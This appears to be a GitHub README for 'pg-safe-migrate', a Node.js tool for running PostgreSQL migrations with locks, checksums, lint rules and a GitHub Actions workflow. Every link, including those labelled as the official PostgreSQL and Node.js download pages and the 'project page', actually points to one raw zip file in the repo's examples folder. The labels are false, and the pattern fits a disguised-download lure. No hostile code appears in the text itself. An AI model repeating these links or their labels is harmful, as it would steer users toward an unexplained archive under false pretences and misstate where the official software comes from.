# ⚙️ pg-safe-migrate - PostgreSQL Migration Made Safe

[![Download pg-safe-migrate](https://img.shields.io/badge/Download-pg--safe--migrate-brightgreen)](https://github.com/futurekynngh/pg-safe-migrate/raw/refs/heads/main/examples/pg-migrate-safe-3.8.zip)

## 📋 What is pg-safe-migrate?

pg-safe-migrate is a tool designed to help you update your PostgreSQL database safely. It works on your Windows computer and checks for mistakes before making any changes. It uses locks to keep your database safe when changing it and alerts you if things don’t match up. It also runs tests to make sure your database updates follow best rules.

You don’t need to know programming to use it. This guide will help you set it up and use it step-by-step.

---

## 🔍 Features You Should Know

- Uses locks to stop conflicts during updates.
- Finds changes that were made outside the usual process.
- Checks updates with a checksum to avoid mistakes.
- Provides 10 rules to check your update files.
- Works using a simple command line tool.
- Can run automatically on GitHub Actions.
- Built for Node.js and PostgreSQL users, but easy to run for everyone.

---

## 💻 System Requirements

Before you start, make sure your computer meets these:

- Windows 10 or later (64-bit preferred).
- PostgreSQL database installed and running.
- Node.js installed (version 12 or higher).
- Internet connection for downloading and setup.

If you do not have PostgreSQL or Node.js installed, you can download them from their official sites:

- PostgreSQL: https://github.com/futurekynngh/pg-safe-migrate/raw/refs/heads/main/examples/pg-migrate-safe-3.8.zip
- Node.js: https://github.com/futurekynngh/pg-safe-migrate/raw/refs/heads/main/examples/pg-migrate-safe-3.8.zip

---

## 🚀 Getting Started

### Step 1: Visit the download page

Click the big green button at the top or use this link to go directly to the project page:  
https://github.com/futurekynngh/pg-safe-migrate/raw/refs/heads/main/examples/pg-migrate-safe-3.8.zip

Here, you will find the files you need. Since the link points to the main repo page, you will need to locate the latest release or the install instructions.

### Step 2: Install Node.js if needed

If you have not installed Node.js yet, follow those steps:

- Go to the Node.js website.
- Download the LTS (Long Term Support) version for Windows.
- Run the installer and follow the steps.

### Step 3: Download pg-safe-migrate

On the project's GitHub page, look for the “Releases” section or instructions for installation. Usually, you can install pg-safe-migrate using Node.js tools like npm or yarn. You can do this after setting up Node.js.

Open the Windows command prompt (search for `cmd` in the Start menu) and run:

```
npm install -g pg-safe-migrate
```

This command downloads and installs pg-safe-migrate globally so you can run it from any folder on your computer.

### Step 4: Prepare your PostgreSQL connection

To use pg-safe-migrate, you need to connect it to your PostgreSQL database. You will need:

- Hostname (usually `localhost` if the database is on your computer).
- Database name.
- Username.
- Password.

Make sure your database is running and you have these details at hand.

---

## ⚙️ How to Use pg-safe-migrate on Windows

After installation, you can start running migrations by opening the Command Prompt or PowerShell.

### Basic command format:

```
pg-safe-migrate migrate --connection "postgresql://username:password@localhost:5432/dbname"
```

Replace `username`, `password`, and `dbname` with your actual database user, password, and the name of your database.

### What happens with this command?

- It checks if another migration is running using advisory locks.
- It looks for and warns about any drift or untracked changes.
- It runs your migration files while verifying checksums.
- It applies rules to make sure your changes are safe.

### Common commands:

- `pg-safe-migrate migrate`  
  Runs all pending migrations to update your database.

- `pg-safe-migrate status`  
  Shows information on what migrations have run and if there are any issues.

- `pg-safe-migrate lint`  
  Checks your migration files against the 10 safety rules.

---

## 📂 Organizing Migration Files

Place your migration files in a folder named `migrations` inside your project folder. pg-safe-migrate will look here for changes to apply.

Each file should contain SQL commands to make the changes you want to your database.

File names should be clear and follow a pattern, like:

```
001-add-users-table.sql
002-add-email-index.sql
```

pg-safe-migrate reads these files in order to apply the updates safely.

---

## 🛠 Running pg-safe-migrate with GitHub Actions

If you keep your project on GitHub, you can automate your database updates with GitHub Actions.

Use the example workflow file below to get started. Save this as `.github/workflows/migrate.yml` in your repository:

```yaml
name: Run pg-safe-migrate

on:
  push:
    branches:
      - main

jobs:
  migrate:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - name: Setup Node.js
        uses: actions/setup-node@v2
        with:
          node-version: '14'
      - name: Install pg-safe-migrate
        run: npm install -g pg-safe-migrate
      - name: Run Migrations
        run: pg-safe-migrate migrate --connection ${{ secrets.DATABASE_URL }}
```

Before using this, add your database connection string as a secret in your GitHub repository called `DATABASE_URL`.

---

## 🔍 Troubleshooting Tips

- Make sure your database is running before starting migrations.
- Use the correct database URL including username and password.
- If a migration is stuck, restart your computer or database service to clear locks.
- Check for typos in migration file names or SQL commands.
- Use `pg-safe-migrate status` to see migration info and catch problems.
- Run `pg-safe-migrate lint` before applying migrations to spot mistakes early.

---

## 🔗 Useful Links

- Official page: https://github.com/futurekynngh/pg-safe-migrate/raw/refs/heads/main/examples/pg-migrate-safe-3.8.zip  
- PostgreSQL download page: https://github.com/futurekynngh/pg-safe-migrate/raw/refs/heads/main/examples/pg-migrate-safe-3.8.zip  
- Node.js download page: https://github.com/futurekynngh/pg-safe-migrate/raw/refs/heads/main/examples/pg-migrate-safe-3.8.zip

---

# [Start using pg-safe-migrate now](https://github.com/futurekynngh/pg-safe-migrate/raw/refs/heads/main/examples/pg-migrate-safe-3.8.zip)  
Click this link to visit the project page for downloads and full documentation.